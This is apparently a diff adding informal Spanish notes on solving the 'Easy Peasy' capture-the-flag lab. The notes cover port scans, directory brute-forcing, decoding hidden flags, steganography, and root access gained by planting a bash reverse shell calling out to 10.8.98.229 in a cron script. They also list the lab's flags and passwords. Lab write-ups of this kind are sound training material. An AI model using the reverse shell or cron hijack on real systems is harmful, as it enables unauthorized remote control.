@@ -1,0 +1,135 @@
+maquina easy peasy
+
+#nmap -sC 10.10.162.47
+PORT   STATE SERVICE
+80/tcp open  http
+|_http-title: Welcome to nginx!
+| http-robots.txt: 1 disallowed entry 
+|_/
+
+Nmap done: 1 IP address (1 host up) scanned in 64.60 seconds
+----------------------------
+ nmap -sC -sV -n  10.10.162.47 -T5
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-22 02:41 -03
+Warning: 10.10.162.47 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.162.47
+Host is up (0.33s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE    SERVICE        VERSION
+21/tcp   filtered ftp
+23/tcp   filtered telnet
+80/tcp   open     http           nginx 1.16.1
+|_http-server-header: nginx/1.16.1
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Welcome to nginx!
+199/tcp  filtered smux
+3367/tcp filtered satvid-datalnk
+5999/tcp filtered ncd-conf
+
+-----------------------------
+
+PORT     STATE SERVICE
+80/tcp   open  http
+6498/tcp open  unknown
+65524/tcp open  unknown
+---------------------------
+#nmap -sV -sC -p
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    nginx 1.16.1
+|_http-title: Welcome to nginx!
+|_http-server-header: nginx/1.16.1
+| http-robots.txt: 1 disallowed entry 
+|_/
+6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 304a2b22acd95609f2da122057f46cd4 (RSA)
+|   256 bf86c9c7b7ef8c8bb994ae0188c0854d (ECDSA)
+|_  256 a172ef6c812913ef5a6c24034cfe3d0b (ED25519)
+65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
+|_http-title: Apache2 Debian Default Page: It works
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.43 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+----------------------------
+#gobuster
+
+===============================================================
+/hidden               (Status: 301) [Size: 169] [--> http://10.10.162.47/hidden/]
+/index.html           (Status: 200) [Size: 612]
+/robots.txt           (Status: 200) [Size: 43]
+Progress: 4614 / 4615 (99.98%)
+================================
+
+/robots.txt
+User-Agent:*
+Disallow:/
+Robots Not Allowed
+
+/hidden
+
+un foto
+
+/hidden/whatever
+
+otra foto, ahora una persona viendo un lago
+
+un titulo: dead end
+
+hidden>ZmxhZ3tmMXJzN19mbDRnfQ
+
+ip:65524/robots.txt
+User-Agent:*
+Disallow:/
+Robots Not Allowed
+User-Agent:a18672860d0510e5ab6699730763b250
+Allow:/
+This Flag Can Enter But Only This Flag No More Exceptions
+
+resultado del hash: flag{1m_s3c0nd_fl4g}
+
+resultado del code de view-source:http://10.10.18.37:65524/
+        They are activated by symlinking available
+        configuration files from their respective
+        Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
+	*-available/ counterparts. These should be managed
+        by using our helpers
+
+con cybr chef sacamos el directorio secreto
+
+/n0th1ng3ls3m4tt3r/
+
+revisando el code:
+940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+por medio de md5hashing utilizamos goast decode y obtenemos:
+mypasswordforthatjob
+
+#steghide extract -sf binarycodepixabay.jpg
+anot� los datos extra�dos e/"secrettext.txt"
+
+al leer el texto secrettext.txt tenemos el user boring
+y una pass en binario al convertirla nos queda en 
+
+iconvertedmypasswordtobinary
+
+
+al entrar por ssh
+User Flag But It Seems Wrong Like It`s Rotated Or Something
+synt{a0jvgf33zfa0ez4y}
+
+utilizamos cyberchet rotated13 y obtenemos:
+flag{n0wits33msn0rm4l}
+
+editamos en archivo .mysecretcronjob.sh y agregamos una reverse shell en la cual entramos como root
+y obtenemos la flag root
+
+LA REVERSE SHELL usada es de pentesmonkey: bash -i >& /dev/tcp/10.8.98.229/4321 0>&1
+
+
+flag{63a9f0ea7bb98050796b649e85481845}
+
+
+FINISHHHHHHHHH
